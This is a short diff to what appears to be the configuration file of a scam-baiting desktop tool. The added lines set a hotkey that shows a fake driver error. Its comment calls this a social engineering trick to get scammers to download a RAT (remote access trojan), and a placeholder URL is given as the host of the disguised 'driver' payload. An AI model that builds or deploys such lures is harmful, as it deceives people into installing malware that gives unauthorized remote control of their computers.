@@ -50,3 +50,10 @@ PROCESS_SCAN_INTERVAL = 2.0
 # Format: pynput hotkey string format
 # Note: <cmd> is the Windows key on Windows, Command key on Mac
 TOGGLE_HOTKEY = "<cmd>+<shift>+f"
+
+# Hotkey to trigger fake driver error (Windows+Shift+G)
+# This is a social engineering trick to get scammers to download the RAT
+DRIVER_ERROR_HOTKEY = "<cmd>+<shift>+g"
+
+# URL where the "driver" (RAT payload) is hosted
+DRIVER_DOWNLOAD_URL = "https://your-domain.com/drivers/remote-desktop-driver.exe"
